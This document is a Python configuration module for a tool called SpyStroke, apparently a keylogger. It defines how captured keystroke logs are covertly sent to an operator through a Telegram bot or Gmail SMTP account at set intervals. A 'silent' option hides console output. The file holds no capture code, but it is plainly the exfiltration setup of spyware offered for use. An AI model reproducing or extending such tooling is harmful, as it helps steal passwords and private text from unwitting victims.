"""Environment-based configuration for SpyStroke.

All credentials and tunables are read from environment variables (or a
``.env`` file in the project root if ``python-dotenv`` is installed), so no
secrets ever need to live in source code.

Environment variables
---------------------
Telegram entry point::

    SPYSTROKE_BOT_TOKEN     Telegram bot token (required)
    SPYSTROKE_CHAT_ID       Chat ID logs are delivered to (required)
    SPYSTROKE_INTERVAL      Seconds between reports (default: 10)
    SPYSTROKE_SILENT        "1" to suppress console output (default: 0)
    SPYSTROKE_LOG_FILE      Optional path to write logs to

Email entry point::

    SPYSTROKE_EMAIL             Sender address (required)
    SPYSTROKE_EMAIL_PASSWORD    SMTP password / app password (required)
    SPYSTROKE_RECEIVER          Optional different recipient
    SPYSTROKE_INTERVAL          Seconds between reports (default: 120)
    SPYSTROKE_SMTP_HOST         SMTP server (default: smtp.gmail.com)
    SPYSTROKE_SMTP_PORT         SMTP port (default: 587)
    SPYSTROKE_SMTP_TLS          "1" for STARTTLS, "0" for implicit TLS (default: 1)
"""

from __future__ import annotations

import logging
import os
from dataclasses import dataclass, field
from typing import Optional

logger = logging.getLogger(__name__)

try:  # pragma: no cover - optional dependency
    from dotenv import load_dotenv

    load_dotenv()
except ImportError:
    load_dotenv = None  # type: ignore[assignment]


def _env(name: str, default: str = "") -> str:
    value = os.getenv(name, default)
    return value.strip()


def _env_int(name: str, default: int) -> int:
    raw = _env(name)
    if not raw:
        return default
    try:
        return int(raw)
    except ValueError:
        logger.warning("Invalid integer for %s (%r), using default %d", name, raw, default)
        return default


def _env_bool(name: str, default: bool) -> bool:
    raw = _env(name)
    if not raw:
        return default
    return raw.lower() in ("1", "true", "yes", "on")


def _env_list(name: str) -> list[str]:
    raw = _env(name)
    if not raw:
        return []
    return [item.strip() for item in raw.split(",") if item.strip()]


@dataclass(frozen=True)
class TelegramConfig:
    """Configuration for the Telegram bot entry point."""

    bot_token: str
    chat_id: str
    interval: int = 10
    silent: bool = False
    log_file: Optional[str] = None

    def validate(self) -> None:
        """Raise ValueError if required settings are missing or invalid."""
        if not self.bot_token or self.bot_token.startswith("Your_"):
            raise ValueError(
                "Telegram bot token is not set. "
                "Provide SPYSTROKE_BOT_TOKEN (or a .env file)."
            )
        if not self.chat_id or self.chat_id.startswith("YOUR_"):
            raise ValueError(
                "Telegram chat ID is not set. "
                "Provide SPYSTROKE_CHAT_ID (or a .env file)."
            )
        if self.interval <= 0:
            raise ValueError("SPYSTROKE_INTERVAL must be a positive number of seconds.")


@dataclass(frozen=True)
class EmailConfig:
    """Configuration for the email entry point."""

    email: str
    password: str
    receiver: Optional[str] = None
    interval: int = 120
    smtp_host: str = "smtp.gmail.com"
    smtp_port: int = 587
    smtp_tls: bool = True
    silent: bool = False
    log_file: Optional[str] = None

    def validate(self) -> None:
        """Raise ValueError if required settings are missing or invalid."""
        if not self.email or self.email.startswith("your_"):
            raise ValueError(
                "Sender email is not set. Provide SPYSTROKE_EMAIL (or a .env file)."
            )
        if not self.password or self.password.startswith("your_"):
            raise ValueError(
                "Email password is not set. Provide SPYSTROKE_EMAIL_PASSWORD "
                "(or a .env file). Note: Gmail requires an app password."
            )
        if self.interval <= 0:
            raise ValueError("SPYSTROKE_INTERVAL must be a positive number of seconds.")
        if self.smtp_port <= 0:
            raise ValueError("SPYSTROKE_SMTP_PORT must be a positive number.")


def load_telegram_config() -> TelegramConfig:
    """Build a TelegramConfig from the environment (or .env file)."""
    return TelegramConfig(
        bot_token=_env("SPYSTROKE_BOT_TOKEN"),
        chat_id=_env("SPYSTROKE_CHAT_ID"),
        interval=_env_int("SPYSTROKE_INTERVAL", 10),
        silent=_env_bool("SPYSTROKE_SILENT", False),
        log_file=_env("SPYSTROKE_LOG_FILE") or None,
    )


def load_email_config() -> EmailConfig:
    """Build an EmailConfig from the environment (or .env file)."""
    return EmailConfig(
        email=_env("SPYSTROKE_EMAIL"),
        password=_env("SPYSTROKE_EMAIL_PASSWORD"),
        receiver=_env("SPYSTROKE_RECEIVER") or None,
        interval=_env_int("SPYSTROKE_INTERVAL", 120),
        smtp_host=_env("SPYSTROKE_SMTP_HOST", "smtp.gmail.com"),
        smtp_port=_env_int("SPYSTROKE_SMTP_PORT", 587),
        smtp_tls=_env_bool("SPYSTROKE_SMTP_TLS", True),
        silent=_env_bool("SPYSTROKE_SILENT", False),
        log_file=_env("SPYSTROKE_LOG_FILE") or None,
    )
